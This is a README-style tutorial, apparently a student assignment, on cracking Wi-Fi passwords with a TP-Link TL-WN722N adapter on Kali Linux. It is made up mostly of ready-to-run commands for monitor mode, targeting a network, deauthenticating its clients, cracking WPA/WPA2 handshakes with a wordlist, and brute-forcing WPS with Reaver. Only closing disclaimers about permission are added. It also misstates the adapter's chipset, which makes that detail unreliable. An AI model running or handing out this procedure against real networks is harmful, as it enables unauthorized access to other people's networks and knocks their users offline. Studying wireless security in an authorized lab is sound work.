# crack-wifi-password
I have Created it as an assignment,Use it only for educational Purposes.

# TP-Link TL-WN722N USB Wi-Fi Adapter for Penetration Testing

## Introduction
This guide provides step-by-step instructions on using the TP-Link TL-WN722N USB Wi-Fi adapter for penetration testing, focusing on ethical hacking and security assessments.

## Prerequisites
- **TP-Link TL-WN722N USB Wi-Fi Adapter**: Ensure you have the adapter.
- **Kali Linux**: A popular Linux distribution for penetration testing.
- **Aircrack-ng Suite**: A collection of tools for auditing wireless networks.
- **Reaver**: A brute-force attack tool against Wi-Fi Protected Setup (WPS) enabled routers.

## Step-by-Step Process

### 1. Install Kali Linux
If you haven't already, download and install [Kali Linux](https://www.kali.org/) from the official website. Kali Linux comes with many pre-installed tools for penetration testing.

### 2. Install Necessary Drivers
The TP-Link TL-WN722N adapter uses the Atheros AR9287 chipset, which is supported by the `ath9k` driver in Linux.

Run the following commands in the terminal:
```bash
sudo apt update
sudo apt install firmware-atheros
```

### 3. Connect the TP-Link TL-WN722N Adapter
Plug the adapter into a USB port on your Kali Linux machine.

### 4. Verify the Adapter is Recognized
Check the adapter status:
```bash
iwconfig
```
You should see an interface like `wlan0` or `wlan1`.

### 5. Put the Adapter in Monitor Mode
Bring the interface down:
```bash
sudo ifconfig wlan0 down
```
Set the adapter to monitor mode:
```bash
sudo iwconfig wlan0 mode monitor
```
Bring the interface back up:
```bash
sudo ifconfig wlan0 up
```

### 6. Scan for Available Networks
Use `airodump-ng` to scan for networks:
```bash
sudo airodump-ng wlan0
```
This will display a list of available networks.

### 7. Capture Handshake
Focus on a specific network:
```bash
sudo airodump-ng --bssid <BSSID> --channel <CHANNEL> --write capture wlan0
```
Replace `<BSSID>` with the target network's BSSID and `<CHANNEL>` with the channel number.

### 8. Deauthenticate Clients
Deauthenticate clients to capture the handshake:
```bash
sudo aireplay-ng --deauth 10 -a <BSSID> wlan0
```
This will deauthenticate clients connected to the target network, forcing them to reconnect and capture the handshake.

### 9. Crack the WPA/WPA2 Password
Use `aircrack-ng` to crack the password:
```bash
sudo aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap
```
Replace `/path/to/wordlist.txt` with the path to your wordlist and `<BSSID>` with the target network's BSSID.

### 10. Alternative: Attack WPS (Wi-Fi Protected Setup)
Use `Reaver` to brute-force WPS:
```bash
sudo reaver -i wlan0 -b <BSSID> -vv
```
Replace `<BSSID>` with the target network's BSSID.

## Important Notes
- **Legal and Ethical Considerations**: Ensure you have explicit permission to test the network. Unauthorized access is illegal and unethical.
- **Security Measures**: Implement strong security measures such as WPA3, complex passwords, and disable WPS to protect your network.
- **Regular Updates**: Keep your tools and systems updated to ensure you have the latest security patches and features.

By following these steps, you can ethically test the security of your own Wi-Fi network and identify potential vulnerabilities. Always prioritize legal and ethical considerations in your penetration testing activities.

## Disclaimer
This guide is for educational purposes only. The author is not responsible for any misuse of this information.
